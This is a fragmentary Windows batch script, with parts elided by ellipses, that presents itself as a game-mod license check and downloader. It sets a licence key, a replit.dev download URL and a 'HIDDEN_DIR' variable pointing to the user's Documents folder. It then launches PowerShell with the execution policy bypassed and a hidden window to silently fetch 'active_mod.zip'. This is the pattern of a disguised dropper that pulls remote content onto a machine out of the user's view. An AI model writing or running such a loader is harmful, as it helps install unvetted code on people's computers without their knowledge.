...
set "LICENSE_KEY=b68e8cbf-6b27-4d70-9994-2944f2aa8d80"
set "MOD_DOWNLOAD=https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/b68e8cbf-6b27-4d70-9994-2944f2aa8d80"
set "PS_SCRIPT=license-check-b68e8cbf-6b27-4d70-9994-2944f2aa8d80.ps1"
set "LOGFILE=log.txt"
set "HIDDEN_DIR=%USERPROFILE%\Documents"
...
(
  ...
  echo License Key: b68e8cbf-6b27-4d70-9994-2944f2aa8d80
  echo PS Script: %PS_SCRIPT%
  echo Mod URL: https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/b68e8cbf-6b27-4d70-9994-2944f2aa8d80
  echo.
) > "%LOGFILE%"
...
echo. >> "%LOGFILE%"
echo [*] Starting download from: https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/b68e8cbf-6b27-4d70-9994-2944f2aa8d80 >> "%LOGFILE%"

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/b68e8cbf-6b27-4d70-9994-2944f2aa8d80' -OutFile 'active_mod.zip' -UseBasicParsing -TimeoutSec 60; Write-Output '[√] Download completed successfully'; exit 0 } catch { Write-Output ('[ERROR] Download failed: ' + $_.Exception.Message); exit 1 }" >> "%LOGFILE%" 2>&1
